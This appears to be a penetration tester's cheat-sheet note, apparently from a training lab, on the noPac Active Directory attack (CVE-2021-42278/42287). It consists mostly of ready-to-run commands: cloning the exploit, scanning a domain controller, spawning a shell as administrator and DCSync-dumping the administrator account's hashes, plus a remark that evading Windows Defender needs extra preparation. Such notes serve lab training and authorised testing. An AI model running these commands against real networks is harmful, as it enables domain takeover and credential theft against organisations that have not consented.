-- -
abuse CVE 2021-42278 and CVE 2021-42287 in conjunction to get System on a DC. Gets you Domain Admin in a couple of commands. You abuse the fact that a  user can register (by default) 10 computers to the domain and the Kerberos Privilege Attribute Certificate (PAC) to trick kerberos and the DC into giving you domain admin. An in-depth explination can be found [here](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)
#### Requirements
[[Install Toolkit|Install Impacket toolkit]]
```bash
# Get NoPac Exploit Repo
git clone https://github.com/Ridter/noPac.git
```
#### Scanning for NoPac
```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
#### Spawn Shell
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
*Note: the tool will save the ticket to your attack machine's disk inside the current working directory as the ccache file.*
#### DCSync the Built-in Admin Account
[[DCSync Attack| In-depth Explanation]]
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
#### Windows Defender considerations
the shell is created using smbexec.py, which will get caught if used vanilla on a target system protected by Windows Defender. So if opsec is to be considered, or a stealth approach is part of the engagement, you will need further preparations to get around Windows Defender. 